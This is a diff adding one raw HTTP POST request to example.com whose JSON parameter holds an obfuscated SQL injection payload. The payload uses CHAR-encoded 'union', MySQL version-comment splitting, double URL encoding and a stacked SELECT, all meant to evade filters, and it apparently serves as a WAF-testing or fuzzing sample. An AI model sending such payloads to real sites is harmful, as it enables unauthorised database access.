@@ -1,0 +1,9 @@
+POST /profile HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/json
+Content-Length: 103
+
+{"param": "'CHAR(117,110,105,111,110)%2520sel/*!90027*/ecT%25201,2,3%3b%2520SeLe/*!76791*/ct%2520NuLL"}
